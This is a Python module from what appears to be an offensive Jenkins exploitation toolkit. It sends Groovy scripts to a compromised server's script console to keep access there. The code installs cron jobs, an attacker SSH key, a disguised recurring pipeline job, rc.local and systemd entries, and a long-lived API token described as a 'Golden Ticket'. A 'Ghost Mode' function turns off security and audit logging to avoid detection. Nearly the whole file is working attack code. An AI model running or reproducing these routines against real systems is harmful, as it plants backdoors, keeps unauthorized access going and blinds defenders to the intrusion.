"""Persistence mechanisms for maintaining access to compromised Jenkins.

Implements various persistence techniques including cron jobs, Jenkins pipelines,
SSH keys, and startup script modifications.
"""

from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class PersistenceResult:
    """Result of persistence operation."""
    success: bool
    method: str
    details: str
    cleanup_command: Optional[str] = None


class PersistenceModule:
    """Implements persistence mechanisms for compromised Jenkins."""

    def __init__(self, session: Any):
        """Initialize persistence module.

        Args:
            session: Authenticated Jenkins session
        """
        self.session = session

    def _execute_groovy(self, script: str) -> Optional[str]:
        """Execute Groovy script on Jenkins.

        Args:
            script: Groovy script to execute

        Returns:
            Script output or None on failure
        """
        try:
            response = self.session.post(
                f"{self.session.target}/scriptText",
                data={"script": script}
            )

            if response.status_code == 200:
                return response.text
            return None
        except Exception:
            return None

    def install_cron_job(self, command: str, schedule: str = "*/5 * * * *") -> PersistenceResult:
        """Install cron job for persistence.

        Args:
            command: Command to execute
            schedule: Cron schedule (default: every 5 minutes)

        Returns:
            PersistenceResult with operation details
        """
        script = f"""
def cronEntry = "{schedule} {command}"
def cronFile = new File("/var/spool/cron/crontabs/" + System.getProperty("user.name"))

try {{
    def currentCron = ""
    if (cronFile.exists()) {{
        currentCron = cronFile.text
    }}

    if (!currentCron.contains("{command}")) {{
        cronFile.append(cronEntry + "\\n")
        println "SUCCESS: Cron job installed"
    }} else {{
        println "INFO: Cron job already exists"
    }}
}} catch (Exception e) {{
    try {{
        def proc = "crontab -l".execute()
        proc.waitFor()
        def currentCron = proc.in.text

        def newCron = currentCron + cronEntry + "\\n"
        def tmpFile = File.createTempFile("cron", ".tmp")
        tmpFile.text = newCron

        "crontab " + tmpFile.absolutePath.execute().waitFor()
        tmpFile.delete()

        println "SUCCESS: Cron job installed via crontab"
    }} catch (Exception e2) {{
        println "ERROR: " + e2.message
    }}
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS" in output:
            return PersistenceResult(
                success=True,
                method="cron_job",
                details=f"Installed cron job: {schedule} {command}",
                cleanup_command=f"crontab -l | grep -v '{command}' | crontab -"
            )
        else:
            return PersistenceResult(
                success=False,
                method="cron_job",
                details=f"Failed to install cron job: {output or 'Unknown error'}"
            )

    def install_ssh_key(self, public_key: str) -> PersistenceResult:
        """Install SSH public key for persistence.

        Args:
            public_key: SSH public key to install

        Returns:
            PersistenceResult with operation details
        """
        script = f"""
def sshDir = new File(System.getProperty("user.home") + "/.ssh")
def authKeysFile = new File(sshDir, "authorized_keys")

try {{
    if (!sshDir.exists()) {{
        sshDir.mkdirs()
        sshDir.setReadable(true, true)
        sshDir.setWritable(true, true)
        sshDir.setExecutable(true, true)
    }}

    def publicKey = "{public_key}"

    if (authKeysFile.exists()) {{
        def currentKeys = authKeysFile.text
        if (!currentKeys.contains(publicKey)) {{
            authKeysFile.append(publicKey + "\\n")
            println "SUCCESS: SSH key installed"
        }} else {{
            println "INFO: SSH key already exists"
        }}
    }} else {{
        authKeysFile.text = publicKey + "\\n"
        authKeysFile.setReadable(true, true)
        authKeysFile.setWritable(true, true)
        println "SUCCESS: SSH key installed (new file)"
    }}
}} catch (Exception e) {{
    println "ERROR: " + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS" in output:
            return PersistenceResult(
                success=True,
                method="ssh_key",
                details="SSH public key installed in ~/.ssh/authorized_keys",
                cleanup_command=f"sed -i '/{public_key[:20]}/d' ~/.ssh/authorized_keys"
            )
        else:
            return PersistenceResult(
                success=False,
                method="ssh_key",
                details=f"Failed to install SSH key: {output or 'Unknown error'}"
            )

    def create_jenkins_pipeline_persistence(self, payload: str, job_name: str = "SystemMaintenance") -> PersistenceResult:
        """Create Jenkins pipeline job for persistence.

        Args:
            payload: Payload to execute in pipeline
            job_name: Name of Jenkins job to create

        Returns:
            PersistenceResult with operation details
        """
        script = f"""
import jenkins.model.Jenkins
import org.jenkinsci.plugins.workflow.job.WorkflowJob
import org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition
import hudson.triggers.TimerTrigger

try {{
    def jenkins = Jenkins.instance
    def jobName = "{job_name}"

    def job = jenkins.getItem(jobName)
    if (job == null) {{
        job = jenkins.createProject(WorkflowJob.class, jobName)
    }}

    def pipelineScript = '''
        pipeline {{
            agent any
            triggers {{
                cron('H/5 * * * *')
            }}
            stages {{
                stage('Execute') {{
                    steps {{
                        script {{
                            {payload}
                        }}
                    }}
                }}
            }}
        }}
    '''

    job.setDefinition(new CpsFlowDefinition(pipelineScript, true))
    job.addTrigger(new TimerTrigger("H/5 * * * *"))
    job.save()

    println "SUCCESS: Pipeline job created: " + jobName
}} catch (Exception e) {{
    println "ERROR: " + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS" in output:
            return PersistenceResult(
                success=True,
                method="jenkins_pipeline",
                details=f"Created Jenkins pipeline job: {job_name}",
                cleanup_command=f"Delete job '{job_name}' from Jenkins UI or via API"
            )
        else:
            return PersistenceResult(
                success=False,
                method="jenkins_pipeline",
                details=f"Failed to create pipeline job: {output or 'Unknown error'}"
            )

    def modify_startup_script(self, command: str, script_path: str = "/etc/rc.local") -> PersistenceResult:
        """Modify system startup script for persistence.

        Args:
            command: Command to add to startup
            script_path: Path to startup script

        Returns:
            PersistenceResult with operation details
        """
        groovy_script = f"""
def scriptPath = "{script_path}"
def command = "{command}"

try {{
    def scriptFile = new File(scriptPath)

    if (scriptFile.exists()) {{
        def content = scriptFile.text

        if (!content.contains(command)) {{
            def lines = content.split("\\n") as List
            def exitLine = lines.findIndexOf {{ it.contains("exit 0") }}

            if (exitLine >= 0) {{
                lines.add(exitLine, command)
            }} else {{
                lines.add(command)
            }}

            scriptFile.text = lines.join("\\n")

            scriptFile.setExecutable(true, false)

            println "SUCCESS: Startup script modified"
        }} else {{
            println "INFO: Command already in startup script"
        }}
    }} else {{
        scriptFile.text = "#!/bin/bash\\n" + command + "\\nexit 0\\n"
        scriptFile.setExecutable(true, false)
        println "SUCCESS: Startup script created"
    }}
}} catch (Exception e) {{
    println "ERROR: " + e.message
}}
"""

        output = self._execute_groovy(groovy_script)

        if output and "SUCCESS" in output:
            return PersistenceResult(
                success=True,
                method="startup_script",
                details=f"Modified startup script: {script_path}",
                cleanup_command=f"sed -i '/{command[:20]}/d' {script_path}"
            )
        else:
            return PersistenceResult(
                success=False,
                method="startup_script",
                details=f"Failed to modify startup script: {output or 'Unknown error'}"
            )

    def install_systemd_service(
        self,
        service_name: str,
        command: str,
        description: str = "System Service"
    ) -> PersistenceResult:
        """Install systemd service for persistence.

        Args:
            service_name: Name of systemd service
            command: Command to execute
            description: Service description

        Returns:
            PersistenceResult with operation details
        """
        service_content = f"""[Unit]
Description={description}
After=network.target

[Service]
Type=simple
ExecStart={command}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

        script = f"""
def serviceName = "{service_name}"
def serviceContent = '''{service_content}'''

try {{
    def serviceFile = new File("/etc/systemd/system/" + serviceName + ".service")
    serviceFile.text = serviceContent

    "systemctl daemon-reload".execute().waitFor()
    "systemctl enable " + serviceName.execute().waitFor()
    "systemctl start " + serviceName.execute().waitFor()

    println "SUCCESS: Systemd service installed and started"
}} catch (Exception e) {{
    println "ERROR: " + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS" in output:
            return PersistenceResult(
                success=True,
                method="systemd_service",
                details=f"Installed systemd service: {service_name}",
                cleanup_command=f"systemctl stop {service_name} && systemctl disable {service_name} && rm /etc/systemd/system/{service_name}.service"
            )
        else:
            return PersistenceResult(
                success=False,
                method="systemd_service",
                details=f"Failed to install systemd service: {output or 'Unknown error'}"
            )

    def generate_api_token(self, token_name: str = "system-integration-service") -> PersistenceResult:
        """Generate persistent API token for current user (Golden Ticket).

        This creates an API token that survives password resets. Works on Jenkins 2.129+.
        Can be called via any RCE method (script console, groovy sandbox, etc).

        Args:
            token_name: Name/description for the token

        Returns:
            PersistenceResult with token details
        """
        script = f"""
import jenkins.model.Jenkins
import hudson.model.User
import jenkins.security.ApiTokenProperty

try {{
    def currentUser = User.current()
    if (currentUser == null) {{
        currentUser = Jenkins.instance.getUser(Jenkins.getAuthentication().getName())
    }}

    def tokenProperty = currentUser.getProperty(ApiTokenProperty.class)
    if (tokenProperty == null) {{
        tokenProperty = new ApiTokenProperty()
        currentUser.addProperty(tokenProperty)
    }}

    def result = tokenProperty.tokenStore.generateNewToken("{token_name}")
    def plainTextToken = result.plainValue

    currentUser.save()

    println "SUCCESS: API token generated"
    println "TOKEN: " + plainTextToken
    println "USER: " + currentUser.getId()
    println "NAME: {token_name}"
}} catch (Exception e) {{
    println "ERROR: " + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS" in output and "TOKEN:" in output:
            lines = output.split("\\n")
            token = ""
            username = ""

            for line in lines:
                if line.startswith("TOKEN:"):
                    token = line.replace("TOKEN:", "").strip()
                elif line.startswith("USER:"):
                    username = line.replace("USER:", "").strip()

            return PersistenceResult(
                success=True,
                method="api_token",
                details=f"Generated API token for user '{username}': {token}",
                cleanup_command=f"Revoke token '{token_name}' from {username}'s user configuration"
            )
        else:
            return PersistenceResult(
                success=False,
                method="api_token",
                details=f"Failed to generate API token: {output or 'Unknown error'}"
            )

    def enable_ghost_mode(self) -> PersistenceResult:
        """Enable Ghost Mode by disabling Jenkins logging.

        Suppresses audit logs, security logs, and general logging to avoid detection.
        Useful before running noisy exploits.

        Returns:
            PersistenceResult with operation status
        """
        script = """
import java.util.logging.*

try {
    Logger rootLogger = Logger.getLogger("")
    rootLogger.setLevel(Level.OFF)

    for (Handler handler : rootLogger.getHandlers()) {
        handler.setLevel(Level.OFF)
    }

    Logger.getLogger("hudson.security").setLevel(Level.OFF)
    Logger.getLogger("jenkins.security").setLevel(Level.OFF)
    Logger.getLogger("org.springframework.security").setLevel(Level.OFF)

    println "SUCCESS: Ghost Mode enabled - all logging suppressed"
} catch (Exception e) {
    println "ERROR: " + e.message
}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS" in output:
            return PersistenceResult(
                success=True,
                method="ghost_mode",
                details="Ghost Mode enabled - Jenkins logging suppressed",
                cleanup_command="Restart Jenkins or re-enable logging via script console"
            )
        else:
            return PersistenceResult(
                success=False,
                method="ghost_mode",
                details=f"Failed to enable Ghost Mode: {output or 'Unknown error'}"
            )

    def disable_ghost_mode(self) -> PersistenceResult:
        """Disable Ghost Mode by restoring Jenkins logging.

        Returns:
            PersistenceResult with operation status
        """
        script = """
import java.util.logging.*

try {
    Logger rootLogger = Logger.getLogger("")
    rootLogger.setLevel(Level.INFO)

    for (Handler handler : rootLogger.getHandlers()) {
        handler.setLevel(Level.INFO)
    }

    Logger.getLogger("hudson.security").setLevel(Level.INFO)
    Logger.getLogger("jenkins.security").setLevel(Level.INFO)
    Logger.getLogger("org.springframework.security").setLevel(Level.INFO)

    println "SUCCESS: Ghost Mode disabled - logging restored"
} catch (Exception e) {
    println "ERROR: " + e.message
}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS" in output:
            return PersistenceResult(
                success=True,
                method="ghost_mode_disable",
                details="Ghost Mode disabled - Jenkins logging restored"
            )
        else:
            return PersistenceResult(
                success=False,
                method="ghost_mode_disable",
                details=f"Failed to disable Ghost Mode: {output or 'Unknown error'}"
            )

    def install_all_persistence(self, payload_command: str, ssh_public_key: Optional[str] = None) -> dict[str, PersistenceResult]:
        """Install multiple persistence mechanisms.

        Args:
            payload_command: Command to persist
            ssh_public_key: Optional SSH public key

        Returns:
            Dictionary mapping method names to PersistenceResult objects
        """
        results = {}

        results["cron"] = self.install_cron_job(payload_command)

        if ssh_public_key:
            results["ssh_key"] = self.install_ssh_key(ssh_public_key)

        results["jenkins_pipeline"] = self.create_jenkins_pipeline_persistence(payload_command)

        results["startup_script"] = self.modify_startup_script(payload_command)

        results["api_token"] = self.generate_api_token()

        return results


def install_persistence(
    session: Any,
    payload_command: str,
    methods: Optional[list] = None,
    ssh_key: Optional[str] = None
) -> dict[str, PersistenceResult]:
    """Factory function to install persistence.

    Args:
        session: Authenticated Jenkins session
        payload_command: Command to persist
        methods: List of methods to use (default: all)
        ssh_key: Optional SSH public key

    Returns:
        Dictionary of persistence results
    """
    module = PersistenceModule(session)

    if methods is None:
        return module.install_all_persistence(payload_command, ssh_key)

    results = {}
    for method in methods:
        if method == "cron":
            results["cron"] = module.install_cron_job(payload_command)
        elif method == "ssh_key" and ssh_key:
            results["ssh_key"] = module.install_ssh_key(ssh_key)
        elif method == "jenkins_pipeline":
            results["jenkins_pipeline"] = module.create_jenkins_pipeline_persistence(payload_command)
        elif method == "startup_script":
            results["startup_script"] = module.modify_startup_script(payload_command)

    return results
